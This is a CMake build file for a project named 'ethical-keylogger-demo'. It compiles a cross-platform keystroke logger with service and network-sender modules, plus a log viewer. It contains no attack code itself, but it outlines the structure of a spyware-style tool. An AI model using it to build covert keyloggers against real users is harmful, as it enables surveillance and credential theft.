cmake_minimum_required(VERSION 3.16)
project(ethical-keylogger-demo VERSION 0.1.0 LANGUAGES CXX)

if(APPLE)
    enable_language(OBJCXX)
endif()

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

set(SOURCES
    src/main.cpp
    src/logger.cpp
    src/service.cpp
    src/net_sender.cpp
    src/platform/keylogger_factory.cpp
)

if(WIN32)
    list(APPEND SOURCES src/platform/keylogger_win.cpp)
elseif(APPLE)
    list(APPEND SOURCES src/platform/keylogger_mac.mm)
elseif(CMAKE_SYSTEM_NAME STREQUAL "Linux")
    list(APPEND SOURCES src/platform/keylogger_linux.cpp)
endif()

add_executable(keylogger ${SOURCES})
add_executable(log_viewer src/log_viewer.cpp)

find_package(Threads REQUIRED)
target_link_libraries(keylogger PRIVATE Threads::Threads)

if(WIN32)
    target_link_libraries(keylogger PRIVATE user32 Ws2_32)
elseif(APPLE)
    find_library(APP_SERVICES ApplicationServices REQUIRED)
    find_library(CARBON Carbon REQUIRED)
    target_link_libraries(keylogger PRIVATE ${APP_SERVICES} ${CARBON})
endif()
